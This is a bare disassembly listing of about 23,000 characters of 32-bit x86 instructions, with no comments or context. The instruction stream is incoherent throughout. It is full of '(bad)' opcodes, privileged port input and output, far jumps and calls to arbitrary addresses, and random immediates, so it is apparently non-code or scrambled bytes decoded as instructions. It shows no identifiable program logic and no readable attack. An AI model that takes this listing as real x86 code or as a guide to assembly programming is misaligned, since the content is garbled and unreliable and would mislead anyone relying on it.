  4041db:	pop    edi
  4041dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041de:	inc    ecx
  4041df:	sub    ecx,eax
  4041e1:	cmp    BYTE PTR [ebx+0x3cbd621],bl
  4041e7:	retf   0x7b11
  4041ea:	and    esi,DWORD PTR [edx-0x1b]
  4041ed:	sbb    bl,BYTE PTR [edx-0xcc6984a]
  4041f3:	inc    ebx
  4041f4:	shl    DWORD PTR [edi-0x3da3b9a1],0x72
  4041fb:	push   ebx
  4041fc:	mov    ds:0x99dbfd7,eax
  404201:	add    BYTE PTR [ebp-0x5baa5854],ch
  404207:	fst    DWORD PTR [edx-0x621d6ad3]
  40420d:	jle    0x404259
  40420f:	push   ebx
  404210:	inc    ecx
  404211:	sub    bh,BYTE PTR [eax-0xfa7ba4c]
  404217:	aas    
  404218:	out    0x34,eax
  40421a:	push   ebp
  40421b:	ret    
  40421c:	arpl   WORD PTR [ecx+0x1eb134f0],si
  404222:	(bad)  
  404223:	mov    cl,0x88
  404225:	lds    esi,FWORD PTR [eax-0x30564fce]
  40422b:	dec    edx
  40422c:	adc    edi,edx
  40422e:	cmp    eax,0x4f59e5fa
  404233:	cmp    edx,DWORD PTR [ebx-0x1b]
  404236:	imul   ebp,DWORD PTR [esi],0x7c
  404239:	fld    DWORD PTR [edx]
  40423b:	and    al,0x39
  40423d:	jns    0x404280
  40423f:	push   esp
  404240:	test   al,0x3b
  404242:	aad    0xac
  404244:	sbb    al,0x47
  404246:	or     DWORD PTR [ebp+0x39c872e6],eax
  40424c:	shl    DWORD PTR [ebp+0x10],1
  40424f:	cli    
  404250:	xchg   ebp,eax
  404251:	fst    st(2)
  404253:	sub    ecx,DWORD PTR [esi+0x65]
  404256:	and    DWORD PTR ds:0x4993afb1,eax
  40425c:	dec    edx
  40425d:	adc    BYTE PTR [eax-0x282ff891],bh
  404263:	jno    0x4041ff
  404265:	mov    ss,WORD PTR [eax]
  404267:	dec    ecx
  404268:	jae    0x404259
  40426a:	retf   0x28af
  40426d:	pop    ecx
  40426e:	cmp    ebp,edx
  404270:	add    dh,0xdb
  404273:	aad    0x15
  404275:	in     eax,dx
  404276:	inc    edi
  404277:	pushf  
  404278:	stc    
  404279:	and    DWORD PTR [esi+0x52],0xaff70bfa
  404280:	push   0xffffff87
  404282:	or     DWORD PTR [ebx+0x26],edi
  404285:	hlt    
  404286:	mov    dh,0xed
  404288:	pop    esi
  404289:	push   eax
  40428a:	xchg   esp,eax
  40428b:	jge    0x404254
  40428d:	mov    esi,0xa9511d48
  404292:	outs   dx,DWORD PTR ds:[esi]
  404293:	xchg   esp,eax
  404294:	cdq    
  404295:	xchg   edx,eax
  404296:	rcr    DWORD PTR [ebp+edi*4+0x3944b408],cl
  40429d:	ret    
  40429e:	mov    bl,0x12
  4042a0:	ret    0x13fd
  4042a3:	shl    BYTE PTR [esi-0x54],1
  4042a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042a7:	aad    0x9f
  4042a9:	push   esi
  4042aa:	fwait
  4042ab:	mov    ?,WORD PTR [esi-0x77331dc0]
  4042b1:	dec    ebx
  4042b2:	ins    DWORD PTR es:[edi],dx
  4042b3:	jne    0x404329
  4042b5:	in     al,0x70
  4042b7:	jae    0x4042e8
  4042b9:	fistp  WORD PTR [ebx]
  4042bb:	test   eax,0x3be8897c
  4042c0:	pop    ecx
  4042c1:	fsubr  st,st(5)
  4042c3:	stos   DWORD PTR es:[edi],eax
  4042c4:	in     al,0xb7
  4042c6:	sbb    DWORD PTR [esi-0xd],edx
  4042c9:	in     al,0x32
  4042cb:	pushf  
  4042cc:	test   DWORD PTR [eax-0x671b7047],eax
  4042d2:	xor    edi,eax
  4042d4:	leave  
  4042d5:	leave  
  4042d6:	sub    eax,DWORD PTR [edx+esi*2]
  4042d9:	mov    edx,0xfda9c4d2
  4042de:	into   
  4042df:	jo     0x4042c9
  4042e1:	and    BYTE PTR [ebx-0x6d],bh
  4042e4:	mov    dh,0x3d
  4042e6:	std    
  4042e7:	sbb    edi,DWORD PTR [eax+0xe4b66d1]
  4042ed:	push   0x3f9eb0e7
  4042f2:	jnp    0x404334
  4042f4:	xchg   DWORD PTR [edi+0x21],esp
  4042f7:	push   eax
  4042f8:	sbb    DWORD PTR [esi],ecx
  4042fa:	mov    edx,0xcfb3331b
  4042ff:	and    ah,BYTE PTR [esi]
  404301:	data16 mov ds:0xf31c4f19,al
  404307:	mov    WORD PTR [esi-0x3c],?
  40430a:	push   es
  40430b:	dec    ecx
  40430c:	(bad)  
  40430d:	dec    ecx
  40430e:	aas    
  40430f:	add    cl,BYTE PTR [ebx+0x60]
  404312:	das    
  404313:	nop
  404314:	jp     0x404377
  404316:	ror    esi,0x31
  404319:	inc    ecx
  40431a:	and    DWORD PTR [edx],0xb17dcfb1
  404320:	outs   dx,BYTE PTR ds:[esi]
  404321:	adc    BYTE PTR [esi-0x3b],dl
  404324:	scas   al,BYTE PTR es:[edi]
  404325:	sbb    al,0xe5
  404327:	push   ebp
  404328:	sub    al,0x9c
  40432a:	add    cl,BYTE PTR [ecx-0x39]
  40432d:	jae    0x40430c
  40432f:	mov    cl,0x5c
  404331:	sub    ah,ah
  404333:	and    edx,DWORD PTR [ebx]
  404335:	jae    0x404397
  404337:	cmp    al,0xd5
  404339:	loopne 0x4042f2
  40433b:	into   
  40433c:	jle    0x404388
  40433e:	fist   WORD PTR [ecx+0x57]
  404341:	imul   edi,DWORD PTR [eax-0x68],0x8ec27e22
  404348:	jmp    0x4042fc
  40434a:	ds ret 
  40434c:	ror    BYTE PTR ds:0x4c4a4798,cl
  404352:	mov    ah,0xd1
  404354:	mov    esp,0x8329b73c
  404359:	xlat   BYTE PTR ds:[ebx]
  40435a:	ins    BYTE PTR es:[edi],dx
  40435b:	jl     0x4043dc
  40435d:	fdiv   DWORD PTR [edi]
  40435f:	scas   eax,DWORD PTR es:[edi]
  404360:	dec    ecx
  404361:	fsub   st,st(3)
  404363:	je     0x40439d
  404365:	ret    
  404366:	adc    eax,0x1d6cabc3
  40436b:	push   esi
  40436c:	iret   
  40436d:	dec    edx
  40436e:	dec    edx
  40436f:	xor    al,0x6b
  404371:	sub    BYTE PTR [eax+0x2856119],dl
  404377:	int    0x82
  404379:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40437a:	push   es
  40437b:	xor    DWORD PTR [esi-0x73],esp
  40437e:	test   eax,0xfe1b26d5
  404383:	jb     0x404387
  404385:	in     eax,0x84
  404387:	or     eax,0x6e725b06
  40438c:	push   eax
  40438d:	xchg   DWORD PTR [ebp-0x24],esi
  404390:	(bad)  
  404391:	les    eax,FWORD PTR [ebx]
  404393:	lods   eax,DWORD PTR ds:[esi]
  404394:	adc    BYTE PTR [esi+0x35],ch
  404397:	dec    ecx
  404398:	xlat   BYTE PTR ds:[ebx]
  404399:	pop    ecx
  40439a:	in     al,dx
  40439b:	rol    BYTE PTR [eax+0xcaee560],1
  4043a1:	jle    0x4043e0
  4043a3:	in     eax,dx
  4043a4:	neg    dl
  4043a6:	push   0x61
  4043a8:	imul   BYTE PTR [ecx+0x5d98d633]
  4043ae:	xchg   DWORD PTR [ebp+0x73],eax
  4043b1:	lock sub al,0x4e
  4043b4:	push   esi
  4043b5:	(bad)  
  4043b7:	sbb    eax,DWORD PTR [ebp+0xa]
  4043ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043bb:	push   edi
  4043bc:	sbb    BYTE PTR [ebp+0x26875fa6],cl
  4043c2:	xor    ah,BYTE PTR [esi]
  4043c4:	fistp  QWORD PTR [edi]
  4043c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043c7:	or     DWORD PTR [ebx+ebx*1],esp
  4043ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043cb:	jne    0x40438e
  4043cd:	test   edi,edx
  4043cf:	iret   
  4043d0:	retf   
  4043d1:	(bad)  
  4043d2:	jbe    0x4043fd
  4043d4:	fs es xchg edx,eax
  4043d7:	jo     0x404431
  4043d9:	fsub   DWORD PTR [edx+ecx*1]
  4043dc:	xchg   ebx,eax
  4043dd:	out    0x3b,al
  4043df:	not    BYTE PTR [ecx]
  4043e1:	or     BYTE PTR [esi+0x5],0x47
  4043e5:	cmp    BYTE PTR [edx-0x6ee23386],cl
  4043eb:	or     eax,0xbc37db17
  4043f0:	jmp    0xd6809374
  4043f5:	ret    
  4043f6:	(bad)  
  4043f7:	(bad)  
  4043f8:	and    BYTE PTR [eax-0x77715b6c],bl
  4043fe:	fnstenv [eax]
  404400:	loop   0x404463
  404402:	test   DWORD PTR [eax+0x52],edi
  404405:	ss cmp eax,0xaf22620e
  40440b:	lods   al,BYTE PTR ds:[esi]
  40440c:	dec    edx
  40440d:	sar    DWORD PTR ds:0x24b8b6ea,cl
  404413:	imul   eax,DWORD PTR [esi+0x5a],0x75
  404417:	or     eax,0x7b6b583c
  40441c:	inc    ebp
  40441d:	xchg   ebp,eax
  40441e:	nop
  40441f:	xchg   edi,eax
  404420:	rol    DWORD PTR [edx+0x4e],cl
  404423:	inc    eax
  404424:	loopne 0x404491
  404426:	and    al,0xc1
  404428:	inc    ecx
  404429:	and    dl,BYTE PTR [edx]
  40442b:	aas    
  40442c:	popa   
  40442d:	out    0x93,al
  40442f:	aas    
  404430:	fdiv   st(5),st
  404432:	shl    DWORD PTR [ecx+edx*2+0x5],0x1
  404437:	aaa    
  404438:	pop    ds
  404439:	loop   0x40442d
  40443b:	ret    
  40443c:	cmp    bh,BYTE PTR [esi-0x23]
  40443f:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404441:	push   0xffffffea
  404443:	xchg   esp,edi
  404445:	inc    DWORD PTR [ecx-0x49af22d0]
  40444b:	stos   BYTE PTR es:[edi],al
  40444c:	jae    0x40444e
  40444e:	pop    es
  40444f:	jns    0x404490
  404451:	mov    WORD PTR [ebx-0x5d],ds
  404454:	cli    
  404455:	mov    esi,0x72bf3ed2
  40445a:	push   edi
  40445b:	fs jne 0x4044ae
  40445e:	gs ja  0x404412
  404461:	fstp   TBYTE PTR ds:0xd923f1ca
  404467:	arpl   WORD PTR [edx+ebp*8+0x4d],dx
  40446b:	jmp    0xc8484989
  404470:	mov    ecx,0x369828e0
  404475:	stos   DWORD PTR es:[edi],eax
  404476:	ins    BYTE PTR es:[edi],dx
  404477:	out    0xe,al
  404479:	xchg   ebx,eax
  40447a:	jne    0x4044cf
  40447c:	mov    bh,0x3b
  40447e:	clc    
  40447f:	fsub   st(7),st
  404481:	push   esp
  404482:	aad    0xdd
  404484:	xchg   edx,eax
  404485:	xchg   esp,eax
  404486:	ins    DWORD PTR es:[edi],dx
  404487:	out    dx,al
  404488:	mov    ebx,0xdb244114
  40448d:	pop    ebp
  40448e:	mov    dl,0xff
  404490:	mov    DWORD PTR [edi+0x28a9d44f],ecx
  404496:	or     BYTE PTR [esp+esi*8-0x5d5b3dcd],cl
  40449d:	add    eax,0x3c159d82
  4044a2:	cmp    al,BYTE PTR [edi]
  4044a4:	imul   esi,DWORD PTR [edi+0x52ab23ac],0x578a85a4
  4044ae:	test   eax,0x50ee9c9d
  4044b3:	jno    0x40452f
  4044b5:	arpl   WORD PTR [edx-0x8],bx
  4044b8:	popa   
  4044b9:	ins    BYTE PTR es:[edi],dx
  4044ba:	add    dh,BYTE PTR [esi]
  4044bc:	sub    ecx,DWORD PTR [esi+0x5fcbca83]
  4044c2:	jmp    0x55e1d0ab
  4044c7:	popf   
  4044c8:	dec    edi
  4044c9:	int    0xf3
  4044cb:	outs   dx,BYTE PTR ds:[esi]
  4044cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044cd:	cwde   
  4044ce:	cwde   
  4044cf:	and    ah,bl
  4044d1:	ror    DWORD PTR [ecx+esi*8],cl
  4044d4:	or     al,0x4f
  4044d6:	idiv   BYTE PTR [eax]
  4044d8:	mov    bl,0xd4
  4044da:	dec    ecx
  4044db:	es xchg edx,eax
  4044dd:	mov    WORD PTR [edx+0x29],cs
  4044e0:	cli    
  4044e1:	cmp    eax,0x126133f6
  4044e6:	mov    ah,0x92
  4044e8:	out    dx,al
  4044e9:	sbb    BYTE PTR [edi+0x9],bh
  4044ec:	(bad)  
  4044ed:	jo     0x40455c
  4044ef:	jp     0x404560
  4044f1:	stos   BYTE PTR es:[edi],al
  4044f2:	pop    es
  4044f3:	les    ebp,FWORD PTR [edx]
  4044f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044f6:	push   esp
  4044f7:	loope  0x40453a
  4044f9:	jae    0x4044bf
  4044fb:	mov    edi,0xf8a2d338
  404500:	cmp    eax,0x854142e4
  404505:	pop    ecx
  404506:	mov    ?,WORD PTR gs:[ecx+0x3d]
  40450a:	cmp    BYTE PTR [esi+0x7e],dh
  40450d:	in     eax,dx
  40450e:	dec    ebx
  40450f:	mov    ebp,edx
  404511:	sbb    eax,0x7c72552e
  404516:	mov    ch,0x99
  404518:	cmp    cl,BYTE PTR [esi+0x35]
  40451b:	or     eax,0xdf3dcd26
  404520:	jb     0x404511
  404522:	sub    al,cl
  404524:	lods   al,BYTE PTR ds:[esi]
  404525:	fld    DWORD PTR [eax]
  404527:	stos   BYTE PTR es:[edi],al
  404528:	mov    bl,0x12
  40452a:	imul   esp,DWORD PTR [esi-0x72cc5eca],0x9af99e78
  404534:	cwde   
  404535:	pop    edx
  404536:	and    esi,DWORD PTR [ebx+0x79fda72a]
  40453c:	nop
  40453d:	sbb    DWORD PTR [ebx],0x5394d43f
  404543:	(bad)  
  404544:	shr    DWORD PTR [eax-0x53],cl
  404547:	xor    al,0x4f
  404549:	xchg   ebp,eax
  40454a:	jo     0x404521
  40454c:	ds dec ebp
  40454e:	inc    eax
  40454f:	ss out 0x6,eax
  404552:	and    ah,dl
  404554:	iret   
  404555:	stc    
  404556:	sbb    ah,BYTE PTR [eax]
  404558:	inc    ebx
  404559:	ins    BYTE PTR es:[edi],dx
  40455a:	push   ebp
  40455b:	enter  0xe52a,0x97
  40455f:	movq   QWORD PTR [ebx-0x49],mm1
  404563:	sub    ah,BYTE PTR [ebp+0x4e2a3f8b]
  404569:	jae    0x40455d
  40456b:	push   ebx
  40456c:	add    ah,BYTE PTR ss:[esi]
  40456f:	enter  0x120b,0x40
  404573:	(bad)  
  404574:	loopne 0x404518
  404576:	push   es
  404577:	fild   QWORD PTR [ebp+0x5fbc967b]
  40457d:	xchg   esi,eax
  40457e:	xor    DWORD PTR [edx],edi
  404580:	inc    ecx
  404581:	int    0x1f
  404583:	or     BYTE PTR [ebx-0x16af8f6],dl
  404589:	inc    si
  40458b:	leave  
  40458c:	lock and esi,DWORD PTR [eax+0x60bda5f7]
  404593:	dec    ecx
  404594:	test   DWORD PTR [esi],esp
  404596:	or     ecx,DWORD PTR [ecx+0x45]
  404599:	cli    
  40459a:	dec    edx
  40459b:	or     BYTE PTR [eax-0x4012c25a],bl
  4045a1:	js     0x40457a
  4045a3:	retf   
  4045a4:	jns    0x404559
  4045a6:	test   al,0x10
  4045a8:	ror    BYTE PTR [edi],1
  4045aa:	lds    ebp,FWORD PTR [ecx]
  4045ac:	jmp    0xc307:0xac9e148e
  4045b3:	mov    edi,0x37426d59
  4045b8:	retf   0xb97c
  4045bb:	xor    dh,BYTE PTR [edi-0x12199e36]
  4045c1:	or     bh,dl
  4045c3:	xor    al,0xe0
  4045c5:	dec    esi
  4045c6:	mov    bl,0x81
  4045c8:	outs   dx,DWORD PTR ds:[esi]
  4045c9:	outs   dx,BYTE PTR ds:[esi]
  4045ca:	xor    al,0x74
  4045cc:	int3   
  4045cd:	push   cs
  4045ce:	(bad)  
  4045cf:	(bad)  
  4045d1:	call   0x49a455bc
  4045d6:	pop    ds
  4045d7:	dec    eax
  4045d8:	sbb    dh,ch
  4045da:	sbb    eax,0xbe39651
  4045df:	(bad)  
  4045e0:	loope  0x404615
  4045e2:	loopne 0x40460e
  4045e4:	and    eax,0xfd1caaa9
  4045e9:	in     al,0x9
  4045eb:	and    eax,0x554a48e9
  4045f0:	sub    ecx,DWORD PTR ds:0xf7565901
  4045f6:	retf   
  4045f7:	jp     0x404633
  4045f9:	xor    eax,0xe42f3e32
  4045fe:	sub    ebp,ecx
  404600:	or     eax,0xe1784551
  404605:	adc    DWORD PTR [ebx+0x229dcae1],0x9ca88668
  40460f:	add    al,0xdc
  404611:	cmp    bh,al
  404613:	call   0x3c241644
  404618:	pop    ds
  404619:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40461a:	sti    
  40461b:	inc    eax
  40461c:	iret   
  40461d:	sbb    al,0xd1
  40461f:	pushf  
  404620:	nop
  404621:	mov    al,ds:0xbce45a3b
  404626:	into   
  404627:	aas    
  404628:	dec    esi
  404629:	or     DWORD PTR [edi+0x29],ecx
  40462c:	pop    edx
  40462d:	and    DWORD PTR [ebp+0x4be5d66d],edi
  404633:	leave  
  404634:	fs and eax,0xc6ae0f5d
  40463a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40463b:	add    al,0xc6
  40463d:	xor    eax,0x957b4f74
  404642:	fidivr WORD PTR [edi-0x5cce84a6]
  404648:	cmp    ah,dl
  40464a:	push   0x6d
  40464c:	jmp    0xc15c:0x4a6d2a2a
  404653:	ret    
  404654:	inc    ebp
  404655:	ds and al,0xda
  404658:	dec    edx
  404659:	icebp  
  40465a:	jnp    0x404663
  40465c:	cmp    al,0x2b
  40465e:	imul   ebx,ebx,0xe80fe283
  404664:	retf   0xd42a
  404667:	into   
  404668:	xor    al,0x5b
  40466a:	mov    al,0x2b
  40466c:	mov    ebx,DWORD PTR [edi]
  40466e:	lds    edi,FWORD PTR [eax]
  404670:	add    ecx,edi
  404672:	cwde   
  404673:	dec    ebx
  404674:	adc    eax,0x4fe36935
  404679:	cmc    
  40467a:	int    0x13
  40467c:	and    eax,DWORD PTR [edx+0x1cc109b6]
  404682:	cwde   
  404683:	jns    0x404646
  404685:	mov    ds:0xd73f60d4,al
  40468a:	jecxz  0x40470a
  40468c:	(bad)  
  40468e:	mov    ebp,eax
  404690:	inc    ebp
  404691:	bswap  esi
  404693:	pop    esp
  404694:	add    BYTE PTR ds:0xb5e34779,bl
  40469a:	pop    ecx
  40469b:	fbstp  TBYTE PTR [ebx]
  40469d:	adc    edi,DWORD PTR [esi-0xb6bf250]
  4046a3:	and    eax,DWORD PTR [ebx-0x5f]
  4046a6:	push   esi
  4046a7:	out    dx,al
  4046a8:	jp     0x4046b8
  4046aa:	mov    cs,WORD PTR [esi-0x47]
  4046ad:	daa    
  4046ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046af:	jle    0x404718
  4046b1:	sub    al,0x9c
  4046b3:	xchg   ecx,eax
  4046b4:	mov    es,WORD PTR [edi]
  4046b6:	fistp  WORD PTR [ebp+0x2de0b20e]
  4046bc:	xor    DWORD PTR ds:0xa730fdf3,0x1b
  4046c3:	das    
  4046c4:	xor    al,0x5a
  4046c6:	dec    edx
  4046c7:	fcom   DWORD PTR ds:0xb5ac38ce
  4046cd:	pop    edi
  4046ce:	sbb    dh,BYTE PTR [ecx]
  4046d0:	enter  0x3169,0xe
  4046d4:	dec    esp
  4046d5:	pop    ds
  4046d6:	es xor eax,0xe4fa483d
  4046dc:	mov    bh,0xdd
  4046de:	addr16 xchg ecx,eax
  4046e0:	or     esp,ecx
  4046e2:	push   0xffffffe6
  4046e4:	mov    DWORD PTR ds:0xcfb771ff,edi
  4046ea:	push   eax
  4046eb:	xlat   BYTE PTR ds:[ebx]
  4046ec:	pop    edi
  4046ed:	jmp    DWORD PTR [edx+0xd]
  4046f0:	cwde   
  4046f1:	sbb    al,ch
  4046f3:	push   esi
  4046f4:	cwde   
  4046f5:	ja     0x4046b9
  4046f7:	pushf  
  4046f8:	pop    esp
  4046f9:	cli    
  4046fa:	mov    ch,0xbc
  4046fc:	mov    bh,0x92
  4046fe:	repz out dx,eax
  404700:	sbb    edi,0x77
  404703:	jae    0x4046a5
  404705:	cmp    BYTE PTR [ecx-0x28],ch
  404708:	mov    bl,0xbb
  40470a:	jae    0x4046d3
  40470c:	dec    esp
  40470d:	fwait
  40470e:	jb     0x4046e8
  404710:	fs je  0x4046ee
  404713:	adc    edi,ecx
  404715:	(bad)  
  404716:	mov    eax,0x3dc17f1a
  40471b:	imul   esi,esp,0x22d53d18
  404721:	or     BYTE PTR [edx-0x30db3d40],bl
  404727:	popf   
  404728:	push   esi
  404729:	lahf   
  40472a:	repnz mov bl,0xd8
  40472d:	pop    esp
  40472e:	sti    
  40472f:	pop    ebp
  404730:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404731:	jae    0x4047b2
  404733:	cmp    BYTE PTR [ebx+0x20933082],bh
  404739:	inc    esp
  40473a:	dec    ebx
  40473b:	inc    ebp
  40473c:	adc    eax,0x2f05fc53
  404741:	jle    0x4047a0
  404743:	dec    edi
  404744:	mov    esp,0xaa20fcd2
  404749:	push   edx
  40474a:	push   ebp
  40474b:	sub    ebp,edi
  40474d:	xor    edi,ecx
  40474f:	outs   dx,BYTE PTR ds:[esi]
  404750:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404751:	sub    ah,bl
  404753:	ss xor dl,bh
  404756:	adc    eax,DWORD PTR [edx+edi*8-0x65]
  40475a:	lods   al,BYTE PTR ds:[esi]
  40475b:	pusha  
  40475c:	retf   0x3dd2
  40475f:	mov    bl,0x75
  404761:	push   eax
  404762:	mov    ah,0xda
  404764:	test   eax,0xfa4061be
  404769:	lock je 0x4047c6
  40476c:	mov    ah,0x3c
  40476e:	mov    esi,0x873e5d9e
  404773:	les    ebp,FWORD PTR [ebp+0x40]
  404776:	xchg   DWORD PTR [edx-0x7b],ecx
  404779:	dec    edi
  40477a:	or     BYTE PTR [ecx+0x79],cl
  40477d:	pop    ebp
  40477e:	sub    eax,0xe7f54a15
  404783:	dec    esp
  404784:	mov    ds,ebx
  404786:	adc    ch,BYTE PTR [ebp-0x55]
  404789:	mov    esp,DWORD PTR [ecx+0x43ce9e74]
  40478f:	sub    BYTE PTR [edi+ebx*1],al
  404792:	jbe    0x4047fb
  404794:	stc    
  404795:	inc    esp
  404796:	push   ss
  404797:	ret    
  404798:	rcl    edx,0x48
  40479b:	push   esp
  40479c:	aad    0x6c
  40479e:	mov    cl,0x5a
  4047a0:	dec    eax
  4047a1:	pop    es
  4047a2:	or     eax,0x7f79b4bf
  4047a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047a8:	(bad)  
  4047a9:	out    0x16,eax
  4047ab:	cmc    
  4047ac:	test   edi,esp
  4047ae:	xchg   DWORD PTR [ebp-0x81590db],ebp
  4047b4:	jb     0x404812
  4047b6:	add    DWORD PTR [ecx+0x5d2228c],eax
  4047bc:	inc    esi
  4047bd:	add    DWORD PTR [edx],ebp
  4047bf:	mov    BYTE PTR [ebx+0x4eecd977],cl
  4047c5:	push   esi
  4047c6:	sbb    eax,0x2e69c518
  4047cb:	dec    edi
  4047cc:	jno    0x4047ac
  4047ce:	mov    ds:0xc69d672e,al
  4047d3:	cmp    bl,BYTE PTR [edi+0x6706de60]
  4047d9:	jno    0x404813
  4047db:	add    ebp,edi
  4047dd:	into   
  4047de:	ror    DWORD PTR [eax],0xde
  4047e1:	mov    bl,BYTE PTR [edi-0x53]
  4047e4:	dec    esp
  4047e5:	test   al,0x76
  4047e7:	lock stos BYTE PTR es:[di],al
  4047ea:	aam    0x24
  4047ec:	push   ecx
  4047ed:	fidivr WORD PTR [ebx]
  4047ef:	loop   0x4047a9
  4047f1:	stos   BYTE PTR es:[edi],al
  4047f2:	add    eax,0x3925a90b
  4047f7:	shl    bh,cl
  4047f9:	mov    WORD PTR [eax],cs
  4047fb:	push   DWORD PTR [edx-0x24d0e3fb]
  404801:	stos   BYTE PTR es:[edi],al
  404802:	pop    esi
  404803:	sub    BYTE PTR [edi+0x495c8ac5],0x25
  40480a:	out    0x9b,al
  40480c:	mov    dl,0xfe
  40480e:	jb     0x404813
  404810:	xchg   esi,eax
  404811:	inc    esi
  404812:	cdq    
  404813:	ror    ebx,cl
  404815:	mov    bl,0xc4
  404817:	cmp    cl,al
  404819:	imul   ecx,DWORD PTR [eax+0x9],0x6d
  40481d:	xchg   edx,eax
  40481e:	dec    edx
  40481f:	and    al,0x36
  404821:	inc    edi
  404822:	sahf   
  404823:	mov    al,ds:0xe75a61ee
  404828:	push   cs
  404829:	adc    ecx,DWORD PTR [eax-0x2b87eca2]
  40482f:	je     0x404837
  404831:	fisttp QWORD PTR [edi-0x25219f5]
  404837:	int3   
  404838:	add    al,0x2e
  40483a:	outs   dx,DWORD PTR ds:[esi]
  40483b:	je     0x4047df
  40483d:	mov    esp,0x11e979cd
  404842:	jmp    0x2ee0c220
  404847:	adc    esp,DWORD PTR [edi-0x10]
  40484a:	xor    eax,DWORD PTR [ebx]
  40484c:	ss das 
  40484e:	mov    WORD PTR [ebx],es
  404850:	pop    edi
  404851:	mov    esp,0x7e7ca81d
  404856:	in     al,dx
  404857:	lods   al,BYTE PTR ds:[esi]
  404858:	fucom  st(2)
  40485a:	daa    
  40485b:	popa   
  40485c:	iret   
  40485d:	and    edx,esi
  40485f:	shr    DWORD PTR [esp+eax*1+0x50],cl
  404863:	dec    edi
  404864:	mul    BYTE PTR [esi-0x16d48704]
  40486a:	ins    BYTE PTR es:[edi],dx
  40486b:	lahf   
  40486c:	shr    BYTE PTR [edi+0x21309bca],cl
  404872:	test   eax,0x3c00bef7
  404877:	xlat   BYTE PTR ds:[ebx]
  404878:	xchg   esp,eax
  404879:	jp     0x404827
  40487b:	jae    0x404832
  40487d:	jns    0x40487b
  40487f:	aas    
  404880:	sahf   
  404881:	inc    ebx
  404882:	inc    edx
  404883:	jno    0x404896
  404885:	sbb    eax,0x4e4f7cea
  40488a:	sub    cl,BYTE PTR [esi+0x1]
  40488d:	aad    0x57
  40488f:	mov    edx,0x9078d52c
  404894:	mov    esp,DWORD PTR [edx+edi*4+0x29f5ece7]
  40489b:	adc    ah,BYTE PTR [ecx+0x7450e00f]
  4048a1:	jle    0x404868
  4048a3:	cmc    
  4048a4:	pop    es
  4048a5:	fs pusha 
  4048a7:	fst    DWORD PTR [eax+0x47f1c8d5]
  4048ad:	pop    eax
  4048ae:	xchg   ebp,eax
  4048af:	xchg   ecx,eax
  4048b0:	aam    0xe6
  4048b2:	cld    
  4048b3:	sub    DWORD PTR [edx-0x1353c760],edi
  4048b9:	sahf   
  4048ba:	notrack call eax
  4048bd:	add    esp,DWORD PTR fs:[ecx-0x1e]
  4048c1:	sti    
  4048c2:	xchg   edx,eax
  4048c3:	rol    BYTE PTR [eax],0xc9
  4048c6:	inc    eax
  4048c7:	add    eax,edx
  4048c9:	and    BYTE PTR [edi],dh
  4048cb:	pop    ebx
  4048cc:	in     al,dx
  4048cd:	sbb    ebx,DWORD PTR [edx-0x58]
  4048d0:	int    0x57
  4048d2:	shr    esp,0x1a
  4048d5:	cmp    eax,0x6b70b969
  4048da:	sahf   
  4048db:	(bad)  
  4048dc:	xchg   esp,eax
  4048dd:	call   0x4d80:0xdec2059b
  4048e4:	ins    BYTE PTR es:[edi],dx
  4048e5:	pop    es
  4048e6:	push   esi
  4048e7:	fdivr  DWORD PTR [eax+esi*2-0x17]
  4048eb:	rcr    DWORD PTR ss:[ecx],0xa5
  4048ef:	cli    
  4048f0:	adc    eax,0x561a98aa
  4048f5:	in     al,0xae
  4048f7:	inc    esi
  4048f8:	push   ecx
  4048f9:	cmp    al,0x2f
  4048fb:	fdiv   DWORD PTR [edi]
  4048fd:	sar    ch,cl
  4048ff:	jo     0x4048b7
  404901:	mov    dh,0x2f
  404903:	mov    ah,0x5b
  404905:	inc    ebp
  404906:	xchg   ebx,eax
  404907:	in     al,0x9f
  404909:	xlat   BYTE PTR ds:[ebx]
  40490a:	mov    bh,0x4b
  40490c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40490d:	int3   
  40490e:	add    al,0x94
  404910:	daa    
  404911:	mov    bl,al
  404913:	push   eax
  404914:	test   BYTE PTR ds:0x31c4aeb8,ah
  40491a:	xor    ebx,DWORD PTR [eax+0x1f776a70]
  404920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404921:	mov    ch,0x1f
  404923:	iret   
  404924:	cmp    DWORD PTR [esi-0x3a724d0],ecx
  40492a:	test   DWORD PTR [ecx-0x71],ebx
  40492d:	dec    ebx
  40492e:	xchg   ebx,eax
  40492f:	add    al,0x22
  404931:	xor    DWORD PTR [eax],eax
  404933:	xchg   ecx,eax
  404934:	fstp   TBYTE PTR [ebx-0x80]
  404937:	lds    edi,FWORD PTR [esi]
  404939:	dec    edi
  40493a:	call   FWORD PTR [esi-0x2071d982]
  404940:	stos   BYTE PTR es:[edi],al
  404941:	fs or  eax,0x9c0b5005
  404947:	xor    cl,ch
  404949:	hlt    
  40494a:	and    BYTE PTR [ecx-0x342e4c47],al
  404950:	int    0xa6
  404952:	addr16 shr eax,cl
  404955:	mov    dh,0x79
  404957:	das    
  404958:	das    
  404959:	xor    ebx,DWORD PTR [edx+ebx*1]
  40495c:	inc    eax
  40495d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40495e:	xchg   ebx,eax
  40495f:	mov    edx,0x1b669e92
  404964:	or     BYTE PTR [edx],dh
  404966:	mov    dl,0xd7
  404968:	rcr    BYTE PTR [eax-0x8e49367],0xb
  40496f:	push   es
  404970:	adc    edx,DWORD PTR [ebx+0x27]
  404973:	sbb    dl,bl
